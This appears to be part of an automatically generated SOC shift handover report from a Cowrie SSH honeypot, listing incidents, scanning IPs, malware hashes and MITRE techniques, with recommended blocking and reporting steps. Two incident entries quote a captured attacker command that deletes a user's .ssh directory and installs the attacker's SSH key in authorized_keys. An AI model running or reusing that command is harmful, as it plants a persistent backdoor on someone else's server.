| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:11:10` | `cowrie.session.connect` |
| `2026-06-09 11:11:10` | `cowrie.client.version` |
| `2026-06-09 11:11:10` | `cowrie.client.kex` |
| `2026-06-09 11:11:10` | `cowrie.login.success` |
| `2026-06-09 11:11:11` | `cowrie.session.params` |
| `2026-06-09 11:11:11` | `cowrie.command.input` |
| `2026-06-09 11:11:11` | `cowrie.command.failed` |
| `2026-06-09 11:11:11` | `cowrie.log.closed` |
| `2026-06-09 11:11:11` | `cowrie.session.params` |
| `2026-06-09 11:11:11` | `cowrie.command.input` |
| `2026-06-09 11:11:11` | `cowrie.session.file_download` |
| `2026-06-09 11:11:11` | `cowrie.log.closed` |
| `2026-06-09 11:11:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57bd47a1b868

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 11:11 |
| **Last Seen** | 2026-06-09 11:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:11:12` | `cowrie.session.connect` |
| `2026-06-09 11:11:12` | `cowrie.client.version` |
| `2026-06-09 11:11:13` | `cowrie.client.kex` |
| `2026-06-09 11:11:13` | `cowrie.login.success` |
| `2026-06-09 11:11:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcc3072ca129

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 11:19 |
| **Last Seen** | 2026-06-09 11:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:19:19` | `cowrie.session.connect` |
| `2026-06-09 11:19:19` | `cowrie.client.version` |
| `2026-06-09 11:19:19` | `cowrie.client.kex` |
| `2026-06-09 11:19:19` | `cowrie.login.success` |
| `2026-06-09 11:19:19` | `cowrie.session.params` |
| `2026-06-09 11:19:19` | `cowrie.command.input` |
| `2026-06-09 11:19:19` | `cowrie.command.failed` |
| `2026-06-09 11:19:20` | `cowrie.log.closed` |
| `2026-06-09 11:19:20` | `cowrie.session.params` |
| `2026-06-09 11:19:20` | `cowrie.command.input` |
| `2026-06-09 11:19:20` | `cowrie.session.file_download` |
| `2026-06-09 11:19:20` | `cowrie.log.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `128.199.25[.]179` | **266** | 2026-06-09 07:53 | 2026-06-09 11:19 | 191m | 0 | `T1592` | 🟠 MEDIUM |
| `172.237.27[.]147` | **147** | 2026-06-09 10:12 | 2026-06-09 10:15 | 8m | 39 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `143.110.178[.]27` | **119** | 2026-06-09 07:53 | 2026-06-09 11:17 | 102m | 0 | `T1592` | 🟠 MEDIUM |
| `92.204.128[.]218` | **76** | 2026-06-09 08:12 | 2026-06-09 11:13 | 38m | 0 | `T1592` | 🟠 MEDIUM |
| `152.32.252[.]65` | **30** | 2026-06-09 09:03 | 2026-06-09 10:07 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `154.217.253[.]190` | **30** | 2026-06-09 09:01 | 2026-06-09 10:06 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.166.137[.]151` | **30** | 2026-06-09 09:01 | 2026-06-09 09:59 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.160.84[.]79` | **30** | 2026-06-09 09:07 | 2026-06-09 10:15 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `81.192.46[.]49` | **30** | 2026-06-09 09:08 | 2026-06-09 10:03 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.13.206[.]100` | **18** | 2026-06-09 10:30 | 2026-06-09 11:19 | 0m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `125.138.175[.]113` | **2** | 2026-06-09 07:54 | 2026-06-09 07:56 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `18.225.109[.]155` | **2** | 2026-06-09 09:35 | 2026-06-09 09:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `40.74.68[.]248` | **2** | 2026-06-09 10:19 | 2026-06-09 10:32 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `110.225.255[.]179` | 1 | 2026-06-09 08:35 | 2026-06-09 08:35 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.227.152[.]171` | 1 | 2026-06-09 10:21 | 2026-06-09 10:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `130.131.220[.]95` | 1 | 2026-06-09 10:20 | 2026-06-09 10:20 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `154.83.196[.]237` | 1 | 2026-06-09 09:09 | 2026-06-09 09:09 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.242.226[.]60` | 1 | 2026-06-09 10:43 | 2026-06-09 10:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.81.140[.]174` | 1 | 2026-06-09 09:49 | 2026-06-09 09:49 | 15s | 0 | `T1592` | 🟢 LOW |
| `223.75.156[.]89` | 1 | 2026-06-09 08:20 | 2026-06-09 08:20 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `38.148.249[.]2` | 1 | 2026-06-09 07:54 | 2026-06-09 07:54 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.24.47[.]94` | 1 | 2026-06-09 11:16 | 2026-06-09 11:16 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.64.242[.]249` | 1 | 2026-06-09 11:17 | 2026-06-09 11:17 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `59.151.214[.]29` | 1 | 2026-06-09 11:00 | 2026-06-09 11:01 | 13s | 0 | `T1592` | 🟢 LOW |
| `60.223.239[.]151` | 1 | 2026-06-09 08:20 | 2026-06-09 08:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]174` | 1 | 2026-06-09 09:32 | 2026-06-09 09:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]63` | 1 | 2026-06-09 10:30 | 2026-06-09 10:30 | 15s | 0 | `T1592` | 🟢 LOW |
| `68.183.236[.]1` | 1 | 2026-06-09 10:23 | 2026-06-09 10:23 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `128.199.25[.]179` | IN | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `66.132.186[.]174` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `143.110.178[.]27` | IN | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `223.75.156[.]89` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `40.74.68[.]248` | JP | Microsoft Corporation | **100** ⚠️ | 8 |
| `20.81.140[.]174` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `60.223.239[.]151` | CN | China Unicom Shanxi Province Network | **100** ⚠️ | 50 |
| `45.160.84[.]79` | BR | DIGITAL VIRTUAL LTDA - ME | **100** ⚠️ | 7 |
| `66.132.195[.]63` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `59.151.214[.]29` | KR | kt HCN Co.,Ltd. | **100** ⚠️ | 17 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 353 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 207 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 148 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 75 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 74 |

---

## 🔕 False Positive Summary (13 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 958 cases |
| Tool 34  | Credential Extractor        | ✅ 364 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 37 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 13 filtered (1.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 148 priority case(s) shown individually · 28 recon entry/entries in table (13 group(s) consolidating 782 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-09T11:20:38Z_
